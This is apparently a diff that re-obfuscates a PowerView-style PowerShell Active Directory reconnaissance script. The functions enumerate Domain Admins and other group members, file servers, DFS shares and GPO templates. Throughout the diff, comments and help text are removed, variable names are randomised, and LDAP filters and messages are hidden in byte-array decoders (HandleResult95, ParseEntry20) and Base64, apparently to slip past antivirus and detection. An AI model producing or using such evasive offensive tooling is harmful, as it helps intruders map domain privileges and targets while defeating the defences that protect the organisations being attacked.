+                    $mPpJqP.filter = ((ParseEntry20 @(30,8,25,47,104,102,64,36,17,23,14,58,5,56,19,123,26,23,110,34,105,59,32,121,26,57,30,124,49,19,1,48,65,19,63,61,41,23,21,51) @(85,75,64,64,10,84,10)) + $GroupName + ")" + $Filter + ")")
                 }
-            
-                $rj90KgZ.FindAll() | Where-Object {$_} | ForEach-Object {
-                    # if we're returning full data objects
+                $mPpJqP.FindAll() | Where-Object {$_} | ForEach-Object {
                     if ($FullData) {
-                        # convert/process the LDAP fields for each result
                         Convert-LDAPProperty -Properties $_.Properties
                     }
                     else {
-                        # otherwise we're just returning the group name
                         $_.properties.samaccountname
                     }
                 }
@@ -4564,203 +2223,112 @@ function Get-NetGroup {
         }
     }
 }
-
-
 function Get-NetGroupMember {
-<#
-    .SYNOPSIS
-
-        This function users [ADSI] and LDAP to query the current AD context
-        or trusted domain for users in a specified group. If no GroupName is
-        specified, it defaults to querying the "Domain Admins" group.
-        This is a replacement for "net group 'name' /domain"
-
-    .PARAMETER GroupName
-
-        The group name to query for users.
-
-    .PARAMETER SID
-
-        The Group SID to query for users. If not given, it defaults to 512 "Domain Admins"
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-
-    .PARAMETER Domain
-
-        The domain to query for group users, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER FullData
-
-        Switch. Returns full data objects instead of just group/users.
-
-    .PARAMETER Recurse
-
-        Switch. If the group member is a group, recursively try to query its members as well.
-
-    .PARAMETER UseMatchingRule
-
-        Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query when -Recurse is specified.
-        Much faster than manual recursion, but doesn't reveal cross-domain groups.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGroupMember
-        
-        Returns the usernames that of members of the "Domain Admins" domain group.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGroupMember -Domain testing -GroupName "Power Users"
-        
-        Returns the usernames that of members of the "Power Users" group in the 'testing' domain.
-
-    .LINK
-
-        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $GroupName,
-
         [String]
         $SID,
-
         [String]
         $Domain = (Get-NetDomain).Name,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [Switch]
         $FullData,
-
         [Switch]
         $Recurse,
-
         [Switch]
         $UseMatchingRule,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        # so this isn't repeated if users are passed on the pipeline
-        $rj90KgZ = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
-
+        $mPpJqP = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
         if(!$DomainController) {
             $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
         }
     }
-
     process {
-
-        if ($rj90KgZ) {
-
+        if ($mPpJqP) {
             if ($Recurse -and $UseMatchingRule) {
-                # resolve the group to a distinguishedname
                 if ($GroupName) {
-                    $ayFBYTwN = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
+                    $tDwvKLfV = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                 }
                 elseif ($SID) {
-                    $ayFBYTwN = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
+                    $tDwvKLfV = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                 }
                 else {
-                    # default to domain admins
-                    $SID = (Get-DomainSID -Domain $Domain) + (HandleResult95 @(113,188,21,39,109,90,213,125) @(61,232,64,95,32))
-                    $ayFBYTwN = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
+                    $SID = (Get-DomainSID -Domain $Domain) + (ParseEntry20 @(205,163,12,81,94,125,188,202) @(129,247,89,41,19,26))
+                    $tDwvKLfV = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                 }
-                $xSAl5J9x = $ayFBYTwN.distinguishedname
-                $MGNOwUzT = $ayFBYTwN.name
-
-                if ($xSAl5J9x) {
-                    $rj90KgZ.filter = ((HandleResult95 @(117,195,204,254,65,127,120,244,196,198,108,39,92,179,195,228,70,11,108,181,246,214,119,116,113,196,212,160,111,55,127,178,216,235,123,121,117,211,253,229,120,26,15,233,207,201,104,59,100,234,250,233,110,39,119,245,218,213,115,58,114,234,208,233,111,55,107,177,219,248,22,53,114,234,196,228,111,25,85,176,216,197,77,116) @(62,128,149,145,34,77)) + $xSAl5J9x + ")" + $Filter + ")")
-                    $rj90KgZ.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))
-
-                    $zRQl = $rj90KgZ.FindAll()
-                    $MGNOwUzT = $GroupName
+                $PAYHdPHz = $tDwvKLfV.distinguishedname
+                $dFLpq5 = $tDwvKLfV.name
+                if ($PAYHdPHz) {
+                    $mPpJqP.filter = ((ParseEntry20 @(92,45,44,21,179,37,40,1,43,135,89,4,23,73,134,98,10,51,40,229,116,41,32,67,159,83,47,68,55,170,86,92,56,0,137,35,37,38,18,164,77,57,68,19,138,79,36,3,32,186,120,22,57,16,153,98,33,49,43,167,91,4,48,2,157,109,59,68,52,185,35,22,57,16,129,98,35,33,17,224,90,58,26,67) @(23,110,117,122,208)) + $PAYHdPHz + ")" + $Filter + ")")
+                    $mPpJqP.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))
+                    $IdJ9 = $mPpJqP.FindAll()
+                    $dFLpq5 = $GroupName
                 }
                 else {
-                    Write-Error (HandleResult95 @(175,201,151,64,252,26,253,149,215,234,122,211,62,194,163,238,192,69,244,16,215,202,212,212,76,253,54,184) @(249,158,162,40,165,119,133))
+                    Write-Error (ParseEntry20 @(137,136,161,242,134,178,236,246,150,151,198,236,150,152,206,234,189,178,197,253,141,236,222,236,187,135,213,167) @(223,223,148,154))
                 }
             }
             else {
                 if ($GroupName) {
-                    $rj90KgZ.filter = ((HandleResult95 @(53,233,55,15,23,168,52,219,52,55,59,170,47,152,40,80,47,205,26,220,13,14,30,163,36,153,36,22,17,194,63,218,37,39,64,242,28,253,59,89) @(126,170,110,96,117,154)) + $GroupName + ")" + $Filter + ")")
+                    $mPpJqP.filter = ((ParseEntry20 @(251,115,79,232,129,130,122,103,221,180,254,0,71,181,165,128,106,65,227,149,211,94,125,190,185,131,122,96,227,187,241,64,93,192,214,216,82,65,210,218) @(176,48,22,135,227)) + $GroupName + ")" + $Filter + ")")
                 }
                 elseif ($SID) {
-                    $rj90KgZ.filter = ((HandleResult95 @(83,113,104,101,134,42,120,64,80,179,86,2,96,56,162,40,104,102,110,146,123,92,90,51,190,43,120,71,110,188,89,66,122,77,221,113,83,92,92,142,124,116,127,64,182,92,2,12) @(24,50,49,10,228)) + $SID + ")" + $Filter + ")")
+                    $mPpJqP.filter = ((ParseEntry20 @(80,39,58,131,121,86,41,157,65,51,45,220,74,86,37,220,65,51,7,154,120,10,8,213,65,87,41,154,127,60,34,156,80,35,90,133,122,9,53,134,127,34,45,166,73,32,83,209) @(27,100,99,236)) + $SID + ")" + $Filter + ")")
                 }
                 else {
-                    # default to domain admins
-                    $SID = (Get-DomainSID -Domain $Domain) + (HandleResult95 @(228,113,195,241,175,9,176,149) @(168,37,150,137,226,110,141))
-                    $rj90KgZ.filter = ((HandleResult95 @(15,237,69,21,38,156,86,11,30,249,82,74,21,156,90,74,30,249,120,12,39,192,119,67,30,157,86,12,32,246,93,10,15,233,37,19,37,195,74,16,32,232,82,48,22,234,44,71) @(68,174,28,122)) + $SID + ")" + $Filter + ")")
+                    $SID = (Get-DomainSID -Domain $Domain) + (ParseEntry20 @(64,227,144,134,19,193,49,138) @(12,183,197,254,94,166))
+                    $mPpJqP.filter = ((ParseEntry20 @(12,76,185,156,132,117,69,145,169,177,9,63,177,193,160,119,85,183,151,144,36,97,139,202,188,116,69,150,151,190,6,127,171,180,223,46,110,141,165,140,35,73,174,185,180,3,63,221) @(71,15,224,243,230)) + $SID + ")" + $Filter + ")")
                 }
-
-                $rj90KgZ.FindAll() | ForEach-Object {
+                $mPpJqP.FindAll() | ForEach-Object {
                     try {
                         if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }
-
-                        $MGNOwUzT = $_.properties.name[0]
-                        $zRQl = @()
-
+                        $dFLpq5 = $_.properties.name[0]
+                        $IdJ9 = @()
                         if ($_.properties.member.Count -eq 0) {
-                            $CdojznMg = $False
-                            $qlOKW = 0
-                            $en5JUiCP = 0
-                            while(!$CdojznMg) {
-                                $en5JUiCP = $qlOKW + 1499
-                                $IBeeMKlS=((HandleResult95 @(54,148,46,73,127,57,149,1,114,21,30,171,26,80,66,56,147,41,0,27) @(84,195,120,61,38)) + $qlOKW + "-" + $en5JUiCP)
-                                $qlOKW += 1500
-                                $rj90KgZ.PropertiesToLoad.Clear()
-                                [void]$rj90KgZ.PropertiesToLoad.Add(($IBeeMKlS))
+                            $PYngQ = $False
+                            $f2Du = 0
+                            $BqREdA = 0
+                            while(!$PYngQ) {
+                                $BqREdA = $f2Du + 1499
+                                $swxU6B6=((ParseEntry20 @(5,92,241,247,62,102,241,250,40,56,237,235,5,102,195,239,55,90,154,190) @(103,11,167,131)) + $f2Du + "-" + $BqREdA)
+                                $f2Du += 1500
+                                $mPpJqP.PropertiesToLoad.Clear()
+                                [void]$mPpJqP.PropertiesToLoad.Add(($swxU6B6))
                                 try {
-                                    $e9hz = $rj90KgZ.FindOne()
-                                    if ($e9hz) {
-                                        $uaIPSfF = $_.Properties.PropertyNames -like (HandleResult95 @(20,183,61,140,178,55,232,42,57,211,33,144,137,55,218,63,38,179,4,197) @(118,224,107,248,235,90,190,83))
-                                        $XdK8679O = $_.Properties.item($uaIPSfF)
-                                        if ($XdK8679O.count -eq 0) {
-                                            $CdojznMg = $True
+                                    $NW6jRjlY = $mPpJqP.FindOne()
+                                    if ($NW6jRjlY) {
+                                        $pC1f = $_.Properties.PropertyNames -like (ParseEntry20 @(228,79,158,157,212,247,208,97,135,218,199,242,228,117,172,133,221,201,233,37) @(134,24,200,233,141,154))
+                                        $PCyLA1 = $_.Properties.item($pC1f)
+                                        if ($PCyLA1.count -eq 0) {
+                                            $PYngQ = $True
                                         }
                                         else {
-                                            $XdK8679O | ForEach-Object {
-                                                $zRQl += $_
+                                            $PCyLA1 | ForEach-Object {
+                                                $IdJ9 += $_
                                             }
                                         }
                                     }
                                     else {
-                                        $CdojznMg = $True
+                                        $PYngQ = $True
                                     }
                                 } 
                                 catch [System.Management.Automation.MethodInvocationException] {
-                                    $CdojznMg = $True
+                                    $PYngQ = $True
                                 }
                             }
                         } 
                         else {
-                            $zRQl = $_.properties.member
+                            $IdJ9 = $_.properties.member
                         }
                     } 
                     catch {
@@ -4768,167 +2336,103 @@ function Get-NetGroupMember {
                     }
                 }
             }
-
-            $zRQl | Where-Object {$_} | ForEach-Object {
-                # if we're doing the LDAP_MATCHING_RULE_IN_CHAIN recursion
+            $IdJ9 | Where-Object {$_} | ForEach-Object {
                 if ($Recurse -and $UseMatchingRule) {
                     $Properties = $_.Properties
                 } 
                 else {
                     if($DomainController) {
-                        $e9hz = [adsi]((HandleResult95 @(80,208,34,158,81,209,31,170,72,226,77,225) @(4,149,112,220)) + $DomainController + "/" + $_)
+                        $NW6jRjlY = [adsi]((ParseEntry20 @(243,62,27,236,183,227,20,63,226,149,154,70) @(167,123,73,174,226)) + $DomainController + "/" + $_)
                     }
                     else {
-                        $e9hz = [adsi]((HandleResult95 @(77,9,101,120,76,8,88,76,85,59,10,7) @(25,76,55,58)) + $_)
+                        $NW6jRjlY = [adsi]((ParseEntry20 @(102,192,128,197,101,166,176,80,126,242,239,186) @(50,133,210,135,48,226,223,38)) + $_)
                     }
-                    if($e9hz){
-                        $Properties = $e9hz.Properties
+                    if($NW6jRjlY){
+                        $Properties = $NW6jRjlY.Properties
                     }
                 }
-
                 if($Properties) {
-
                     if($Properties.samaccounttype -notmatch '805306368') {
-                        $tHuZe6n = $True
+                        $GOwA = $True
                     }
                     else {
-                        $tHuZe6n = $False
+                        $GOwA = $False
                     }
-
                     if ($FullData) {
-                        $dmTGBuhN = Convert-LDAPProperty -Properties $Properties
+                        $IPiHHq = Convert-LDAPProperty -Properties $Properties
                     }
                     else {
-                        $dmTGBuhN = New-Object PSObject
+                        $IPiHHq = New-Object PSObject
                     }
-
-                    $dmTGBuhN | Add-Member Noteproperty 'GroupDomain' $Domain
-                    $dmTGBuhN | Add-Member Noteproperty 'GroupName' $MGNOwUzT
-
+                    $IPiHHq | Add-Member Noteproperty 'GroupDomain' $Domain
+                    $IPiHHq | Add-Member Noteproperty 'GroupName' $dFLpq5
                     try {
-                        $wKM7 = $Properties.distinguishedname[0]
-                        
-                        # extract the FQDN from the Distinguished Name
-                        $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(149,8,152,98) @(199,77,213,91,101,138)))) -replace 'DC=','' -replace ',','.'
+                        $EybC7 = $Properties.distinguishedname[0]
+                        $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(241,21,117,174) @(163,80,56,151,11,71,115,75)))) -replace 'DC=','' -replace ',','.'
                     }
                     catch {
-                        $wKM7 = $Null
-                        $LFju8kS = $Null
+                        $EybC7 = $Null
+                        $YLe0 = $Null
                     }
-
                     if ($Properties.samaccountname) {
-                        # forest users have the samAccountName set
-                        $oIRTSkE = $Properties.samaccountname[0]
+                        $s15G = $Properties.samaccountname[0]
                     } 
                     else {
-                        # external trust users have a SID, so convert it
                         try {
-                            $oIRTSkE = Convert-SidToName $Properties.cn[0]
+                            $s15G = Convert-SidToName $Properties.cn[0]
                         }
                         catch {
-                            # if there's a problem contacting the domain to resolve the SID
-                            $oIRTSkE = $Properties.cn
+                            $s15G = $Properties.cn
                         }
                     }
-                    
                     if($Properties.objectSid) {
-                        $ZZwWd7MV = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
+                        $MrMfOu = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                     }
                     else {
-                        $ZZwWd7MV = $Null
+                        $MrMfOu = $Null
                     }
-
-                    $dmTGBuhN | Add-Member Noteproperty 'MemberDomain' $LFju8kS
-                    $dmTGBuhN | Add-Member Noteproperty 'MemberName' $oIRTSkE
-                    $dmTGBuhN | Add-Member Noteproperty 'MemberSid' $ZZwWd7MV
-                    $dmTGBuhN | Add-Member Noteproperty 'IsGroup' $tHuZe6n
-                    $dmTGBuhN | Add-Member Noteproperty 'MemberDN' $wKM7
-                    $dmTGBuhN
-
-                    # if we're doing manual recursion
-                    if ($Recurse -and !$UseMatchingRule -and $tHuZe6n -and $oIRTSkE) {
-                        Get-NetGroupMember -FullData -Domain $LFju8kS -DomainController $DomainController -GroupName $oIRTSkE -Recurse -PageSize $PageSize
+                    $IPiHHq | Add-Member Noteproperty 'MemberDomain' $YLe0
+                    $IPiHHq | Add-Member Noteproperty 'MemberName' $s15G
+                    $IPiHHq | Add-Member Noteproperty 'MemberSid' $MrMfOu
+                    $IPiHHq | Add-Member Noteproperty 'IsGroup' $GOwA
+                    $IPiHHq | Add-Member Noteproperty 'MemberDN' $EybC7
+                    $IPiHHq
+                    if ($Recurse -and !$UseMatchingRule -and $GOwA -and $s15G) {
+                        Get-NetGroupMember -FullData -Domain $YLe0 -DomainController $DomainController -GroupName $s15G -Recurse -PageSize $PageSize
                     }
                 }
-
             }
         }
     }
 }
-
-
 function Get-NetFileServer {
-<#
-    .SYNOPSIS
-
-        Returns a list of all file servers extracted from user 
-        homedirectory, scriptpath, and profilepath fields.
-
-    .PARAMETER Domain
-
-        The domain to query for user file servers, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER TargetUsers
-
-        An array of users to query for file servers.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetFileServer
-        
-        Returns active file servers.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetFileServer -Domain testing
-        
-        Returns active file servers for the 'testing' domain.
-#>
-
     [CmdletBinding()]
     param(
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String[]]
         $TargetUsers,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     function SplitPath {
-        # short internal helper to split UNC server paths
         param([String]$Path)
-
-        if ($Path -and ($Path.split(([char]0x5c+[char]0x5c)).Count -ge 3)) {
-            $mTXSeLD = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
-            if($mTXSeLD -and ($mTXSeLD -ne '')) {
-                $mTXSeLD
+        if ($Path -and ($Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))).Count -ge 3)) {
+            $kTso = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
+            if($kTso -and ($kTso -ne '')) {
+                $kTso
             }
         }
     }
-
     Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {
-            # filter for any target users
             if($TargetUsers) {
                 $TargetUsers -Match $_.samAccountName
             }
             else { $True } 
         } | Foreach-Object {
-            # split out every potential file server path
             if($_.homedirectory) {
                 SplitPath($_.homedirectory)
             }
@@ -4938,1127 +2442,599 @@ function Get-NetFileServer {
             if($_.profilepath) {
                 SplitPath($_.profilepath)
             }
-
         } | Where-Object {$_} | Sort-Object -Unique
 }
-
-
 function Get-DFSshare {
-<#
-    .SYNOPSIS
-
-        Returns a list of all fault-tolerant distributed file
-        systems for a given domain.
-
-    .PARAMETER Version
-
-        The version of DFS to query for servers.
-        1/v1, 2/v2, or all
-
-    .PARAMETER Domain
-
-        The domain to query for user DFS shares, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-DFSshare
-        
-        Returns all distributed file system shares for the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-DFSshare -Domain test
-        
-        Returns all distributed file system shares for the 'test' domain.
-#>
-
     [CmdletBinding()]
     param(
         [String]
-        [ValidateSet((HandleResult95 @(255,58,23,80) @(174,109,111,35,68,187)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VjE="))),"1",([char]0x56+[char]0x32),"2")]
-        $Version = (HandleResult95 @(228,133,170,209) @(181,210,210,162,146,16,4)),
-
+        [ValidateSet((ParseEntry20 @(90,173,39,58) @(11,250,95,73,135,145)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VjE="))),"1",([char]0x56+[char]0x32),"2")]
+        $Version = (ParseEntry20 @(26,31,211,109) @(75,72,171,30,82)),
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     function Get-DFSshareV1 {
         [CmdletBinding()]
         param(
             [String]
             $Domain,
-
             [String]
             $DomainController,
-
             [String]
             $ADSpath,
-
             [ValidateRange(1,10000)] 
             [Int]
             $PageSize = 200
         )
-
-        $mSHPOj = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
-
-        if($mSHPOj) {
-            $quvg = @()
-            $mSHPOj.filter = (HandleResult95 @(238,65,93,88,120,77,39,212,88,83,121,42,46,95,221,106,103,4,87,70,55,201,80,65,109,116,50,29,238,83,57,10) @(165,2,4,55,26,127,109))
-
+        $uZjYMk = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        if($uZjYMk) {
+            $ybIBLW = @()
+            $uZjYMk.filter = (ParseEntry20 @(97,241,216,23,29,110,110,173,112,229,207,72,46,110,92,180,73,129,204,65,37,48,118,153,112,220,204,8,52,13,25,225) @(42,178,129,120,127,92,36,220))
             try {
-                $mSHPOj.FindAll() | Where-Object {$_} | ForEach-Object {
+                $uZjYMk.FindAll() | Where-Object {$_} | ForEach-Object {
                     $Properties = $_.Properties
-                    $JtTi99s = $Properties.remoteservername
-
-                    $quvg += $JtTi99s | ForEach-Object {
+                    $U4wVsDjl = $Properties.remoteservername
+                    $ybIBLW += $U4wVsDjl | ForEach-Object {
                         try {
                             if ( $_.Contains('\') ) {
                                 New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                             }
                         }
                         catch {
-                            Write-Debug ((HandleResult95 @(253,29,60,155,205,118,63,133,206,18,66,133,204,2,48,155,204,119,26,151,245,60,52,167,253,41,59,133,204,119,30,138,204,40,35,133,224,44,55,223) @(175,69,118,226)) + $_)
+                            Write-Debug ((ParseEntry20 @(250,141,5,1,170,247,188,207,180,24,76,175,167,178,238,172,44,74,164,177,175,209,151,10,42,164,137,146,203,231,39,16,171,169,160,207,154,38,57,245) @(168,213,79,120,200,196,245)) + $_)
                         }
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(14,43,142,219,16,76,138,172,9,42,150,132,5,65,146,135,10,115,145,140,6,65,146,146,62,42,145,140,19,112,153,214) @(92,25,216,235)) + $_)
+                Write-Warning ((ParseEntry20 @(13,156,245,210,19,251,241,165,10,157,237,141,6,246,233,142,9,196,234,133,5,246,233,155,61,157,234,133,16,199,226,223) @(95,174,163,226)) + $_)
             }
-            $quvg | Sort-Object -Property (HandleResult95 @(94,238,30,17,38,56,209,36,48,118,93,250,44,8,18,114,215,37,35,48,81,210,117,88) @(11,131,72,101,68))
+            $ybIBLW | Sort-Object -Property (ParseEntry20 @(82,17,89,83,144,52,46,99,114,192,81,5,107,74,164,126,40,98,97,134,93,45,50,26) @(7,124,15,39,242))
         }
     }
-
     function Get-DFSshareV2 {
         [CmdletBinding()]
         param(
             [String]
             $Domain,
-
             [String]
             $DomainController,
-
             [String]
             $ADSpath,
-
             [ValidateRange(1,10000)] 
             [Int]
             $PageSize = 200
         )
-
-        $mSHPOj = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
-
-        if($mSHPOj) {
-            $quvg = @()
-            $mSHPOj.filter = (HandleResult95 @(223,27,175,61,173,119,88,153,206,15,184,98,158,119,106,128,247,107,187,107,173,29,92,173,198,52,187,38,155,2,126,157,245,107,175,43,132,22,121,213) @(148,88,246,82,207,69,18,232))
-            $mSHPOj.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
-
+        $uZjYMk = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        if($uZjYMk) {
+            $ybIBLW = @()
+            $uZjYMk.filter = (ParseEntry20 @(195,137,67,159,235,29,249,249,144,77,190,185,126,129,240,162,121,195,196,22,209,208,132,95,162,229,98,199,220,141,118,133,232,28,234,241,129,73,155,180) @(136,202,26,240,137,47,179))
+            $uZjYMk.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
             try {
-                $mSHPOj.FindAll() | Where-Object {$_} | ForEach-Object {
+                $uZjYMk.FindAll() | Where-Object {$_} | ForEach-Object {
                     $Properties = $_.Properties
-                    $PyRQ = $Properties.'msdfs-targetlistv2'[0]
-                    $qhZ8cV8o = [xml][System.Text.Encoding]::Unicode.GetString($PyRQ[2..($PyRQ.Length-1)])
-                    $quvg += $qhZ8cV8o.targets.ChildNodes | ForEach-Object {
+                    $wWyrJuG = $Properties.'msdfs-targetlistv2'[0]
+                    $N3W25AE = [xml][System.Text.Encoding]::Unicode.GetString($wWyrJuG[2..($wWyrJuG.Length-1)])
+                    $ybIBLW += $N3W25AE.targets.ChildNodes | ForEach-Object {
                         try {
-                            $EJ00Y5Wa = $_.InnerText
-                            if ( $EJ00Y5Wa.Contains('\') ) {
-                                $f9zTEa = $EJ00Y5Wa.split("\")[3]
-                                $hfFqF2 = $Properties.'msdfs-linkpathv2'[0]
-                                New-Object -TypeName PSObject -Property @{'Name'=($f9zTEa + $hfFqF2);'RemoteServerName'=$EJ00Y5Wa.split("\")[2]}
+                            $g51UVwUV = $_.InnerText
+                            if ( $g51UVwUV.Contains('\') ) {
+                                $Nmi8SkOB = $g51UVwUV.split("\")[3]
+                                $dD9oqq92 = $Properties.'msdfs-linkpathv2'[0]
+                                New-Object -TypeName PSObject -Property @{'Name'=($Nmi8SkOB + $dD9oqq92);'RemoteServerName'=$g51UVwUV.split("\")[2]}
                             }
                         }
                         catch {
-                            Write-Debug ((HandleResult95 @(91,195,26,33,194,219,54,69,104,204,100,63,195,175,57,91,106,169,60,45,250,145,61,18,80,195,26,54,250,176,46,69,70,242,17,101) @(9,155,80,88,160,232,127,34)) + $_)
+                            Write-Debug ((ParseEntry20 @(142,131,4,97,190,232,7,127,189,140,122,127,191,156,8,97,191,233,34,109,134,162,12,40,133,131,4,118,134,131,31,127,147,178,15,37) @(220,219,78,24)) + $_)
                         }
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(3,187,253,51,33,188,69,89,4,186,229,108,52,177,93,114,7,227,226,100,55,177,93,103,51,186,226,100,34,128,86,35) @(81,137,171,3,109,233,23,30)) + $_)
+                Write-Warning ((ParseEntry20 @(123,176,119,253,200,59,123,197,116,254,202,1,112,218,107,161,210,4,96,229,123,149,206,23,75,177,104,170,203,7,104,191) @(41,130,33,205,132,110)) + $_)
             }
-            $quvg | Sort-Object -Unique -Property (HandleResult95 @(72,41,190,110,163,76,101,113,17,218,76,184,27,90,75,61,188,119,135,11,109,76,121,213) @(29,68,232,26,193,127,55))
+            $ybIBLW | Sort-Object -Unique -Property (ParseEntry20 @(55,62,241,168,0,96,245,176,55,97,241,165,6,62,241,165,54,62,225,168,56,2,154,225) @(98,83,167,220))
         }
     }
-
-    $quvg = @()
-    
-    if ( ($Version -eq (HandleResult95 @(90,49,212,157) @(3,102,172,238,29,197))) -or ($Version.endsWith("1")) ) {
-        $quvg += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+    $ybIBLW = @()
+    if ( ($Version -eq (ParseEntry20 @(214,128,185,133) @(143,215,193,246,20))) -or ($Version.endsWith("1")) ) {
+        $ybIBLW += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
-    if ( ($Version -eq (HandleResult95 @(122,202,124,133) @(35,157,4,246,99))) -or ($Version.endsWith("2")) ) {
-        $quvg += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+    if ( ($Version -eq (ParseEntry20 @(62,172,49,219) @(103,251,73,168,187))) -or ($Version.endsWith("2")) ) {
+        $ybIBLW += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
-
-    $quvg | Sort-Object -Property (HandleResult95 @(115,88,139,151,147,54,116,89,136,209,167,124,66,88,139,154,165,104,96,65,135,178,204,56) @(38,53,221,227,241,5))
+    $ybIBLW | Sort-Object -Property (ParseEntry20 @(222,222,66,165,179,10,131,181,222,129,66,168,181,84,135,160,223,222,82,165,139,104,236,228) @(139,179,20,209,209,57,209,217))
 }
-
-
-########################################################
-#
-# GPO related functions.
-#
-########################################################
-
 function Get-GptTmpl {
-<#
-    .SYNOPSIS
-
-        Helper to parse a GptTmpl.inf policy file path into a custom object.
-
-    .PARAMETER GptTmplPath
-
-        The GptTmpl.inf file path name to parse. 
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount the target GptTmpl folder path as a temporary PSDrive.
-
-    .EXAMPLE
-
-        PS C:\> Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
-
-        Parse the default domain policy .inf for dev.testlab.local
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
         [String]
         $GptTmplPath,
-
         [Switch]
         $UsePSDrive
     )
-
     begin {
         if($UsePSDrive) {
-            # if we're PSDrives, create a temporary mount point
-            $u5Ie777 = $GptTmplPath.split('\')
-            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
